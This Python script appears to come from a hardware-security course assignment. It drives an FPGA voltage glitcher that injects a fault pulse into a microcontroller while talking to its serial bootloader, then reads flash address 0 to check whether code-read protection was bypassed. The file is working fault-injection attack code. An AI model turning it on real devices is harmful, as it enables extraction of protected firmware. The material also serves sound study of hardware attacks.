# Partially based on https://github.com/toothlessco/arty-glitcher/blob/master/python/assignment5.py

import time
import serial as ser
import uu
from glitcher import glitcher
import logging

PROTECTED = "prot"
UNPROTECTED = "unprot"
EOL = b"\r\n"
SER_PORT = "com7"

def open_port(serial, baud):
    print(f"Serial communication opened on port {serial} at {baud} baud.")
    return ser.Serial(serial, baud, timeout=0.2)

def expect_read(serial, expected):
    result = ""
    # Don't attempt to read more than 1 times
    for i in range(0, 1):
        result += serial.read(len(expected)).decode('UTF-8')
        if expected in result:
            return None;

    print("! Expected = " + repr(expected) + " got " + repr(result))
    return result

def read_address(serial, address, length):
    cmd = 'R {:d} {:d}\r\n'.format(address, length)
    serial.write(cmd.encode())

    result = ""
    # Don't attempt to read more than 1 times
    for i in range(0, 1):
        result += serial.read(61).decode('UTF-8')
        if '\r\n' in result:
            break
    
    # Check if command succeeded.
    if '\r0' in result:
        serial.write(b'OK\r\n')
        expect_read(serial, 'OK\r\n')
        return result
    
    # print(result)

    return None

def check_protected(serial, khz, debugPrint):

    ################################## Syncing the Device ############################################
    serial.write(b"?")
    
    if debugPrint:
        print("Synchronization handshake initiated... ")

    if serial.readline() == b"Synchronized" + EOL:
        serial.write(b"Synchronized" + EOL)
    else:
        if debugPrint:
            print("Synchronization failed. No response from target device.")
        return False

    clk = str(khz).encode('UTF-8')   
    if serial.readline() == b"Synchronized\rOK" + EOL:
        
        if debugPrint:
            print("Synchronized with target device.")
            print("Setting device clock freq... ")

        serial.write(clk + EOL)
    else:
     
        if debugPrint:
            print("Synchronization failed. Target aborted synchronization.")
            
        return False

    if serial.readline() == clk + b"\rOK" + EOL:
        if debugPrint:
            print("Clock frequency set at %.3f Mhz" % (khz / 1000.0))
    else:
        if debugPrint:
            print("Failed to set clock frequency to %.3f Mhz" % (khz / 1000.0))
            
        return False
  
    if debugPrint:
        print("Communications setup with target device succeeded.")

    ################################## Check if protected ############################################
    r = read_address(serial, 0, 4)
    
    if r is None:
        return PROTECTED
    else:
        print("Yeah, unprotected")
        print(r)
        return UNPROTECTED
        
    return (r == None)

def close_port(serial):
    serial.close()

if __name__=="__main__":
    port = open_port(SER_PORT, 115200)
    
    logging.basicConfig(level = logging.INFO)
    
    glitcher = glitcher()
    glitcher.reset_fpga() 
    
    # Set the fault voltage, normal voltage, off voltage
    glitcher.set_voltages(0.6, 1.7, 0)
    
    glitcher.dac.setTestModeEnabled(0)
    glitcher.dac.setRfidModeEnabled(0)

   
    
    # Clean up any previous pulses
    glitcher.dac.clearPulses()

    # Set a pulse
    glitcher.add_pulse(100000, 5000)
    
    # Reset uc
    glitcher.dac.setEnabled(False)
    time.sleep(.1)
    glitcher.dac.setEnabled(True)

    # Arm the fault
    glitcher.dac.arm()

    # Generate a software trigger
    glitcher.dac.softwareTrigger()  
    
    status = check_protected(port, 12000, False);
    #status = False
    
    if status == False:
        print("Communication failed, restarting")
    elif status == PROTECTED:
        print("Protected, next param")
    elif status == UNPROTECTED:
        print("WOOT!")
    else:
        print("Invalid return value!")
    
    close_port(port)
    glitcher.close()




